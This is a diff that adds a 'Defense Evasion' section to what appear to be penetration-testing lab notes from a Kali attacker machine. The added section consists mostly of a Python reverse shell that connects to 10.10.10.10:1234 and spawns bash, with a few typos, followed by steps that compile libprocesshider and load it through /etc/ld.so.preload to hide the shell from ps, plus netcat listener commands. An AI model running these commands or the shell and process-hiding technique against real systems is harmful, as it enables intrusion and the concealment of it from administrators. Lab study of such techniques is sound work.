@@ -115,6 +115,68 @@ On kali (attacker VM)
    - run anyway                                           #(reverse shell works via meterpreter !)
    
    
+### Defense Evasion
+
+
+$ cat /etc/*release
+$ uname -a 
+$ ps aux
+
+#(Git clone libprocesshider)
+
+$ /tmp/libprocesshider$ make                                    #(compilation activated)
+
+$ nc -nlvp 1234 ...
+
+#(Create a reverse shell python )
+
+$ nano shell.py
+    - #!/usr/bin/python3
+      from os import dup2
+      from subprocess import run
+      import socket
+      s=socket.socker(socket.AF_INET.socket.SOCK_STREAM)
+      s.connect(("10.10.10.10",1234))
+      dup2(s.fileno(),0)
+      dup2(s.fileno(),1)
+      dup2(s.fileno(),2)
+      run(["/bin/bash","-i"])
+      
+$ /tmp/ $ chmod +x shell.py
+$ /tmp/ $ tmux
+$ /tmp/ $ ./shell.py
+
+$ /tmp/ $ ps aux                              #(we wanna hide "/usr/bin/python3/shell.py" on the list)
+$ /tmp/libprocesshider$ nano processhider.c                   #(customize it = shell.py)
+$ /tmp/libprocesshider$ make                                  #(compilation activated)
+$ /tmp/libprocesshider$ cp libprocesshider.so /usr/local/lib
+$ /tmp/libprocesshider$ ls -al /usr/local/lib
+$ /tmp/libprocesshider$ echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+$ /tmp/libprocesshider$ cat /etc/ld.so.preload
+
+$ nc -nlvp 1234 ...
+
+$ /tmp/ $ ./shell.py
+ 
+$ /tmp/ $ ps aux               #(Hide success!)       
+
+      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+   
+   
        
  
  
